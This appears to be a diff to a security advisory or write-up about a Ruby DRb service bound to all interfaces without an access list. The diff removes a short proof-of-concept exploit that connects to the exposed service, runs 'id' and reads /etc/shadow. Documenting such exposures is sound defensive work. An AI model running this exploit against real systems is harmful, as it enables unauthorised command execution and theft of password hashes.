@@ -35,12 +35,3 @@ The DRb service binds to all interfaces without ACL:
 URI = "druby://0.0.0.0:8787"
 DRb.start_service(URI, DRbService.new)
 ```
-
-Exploitation from a remote host:
-```ruby
-require 'drb/drb'
-DRb.start_service
-obj = DRbObject.new_with_uri('druby://TARGET:8787')
-puts obj.exec_command('id')       # Executes 'id' on the target
-puts obj.read_file('/etc/shadow') # Reads /etc/shadow
-```
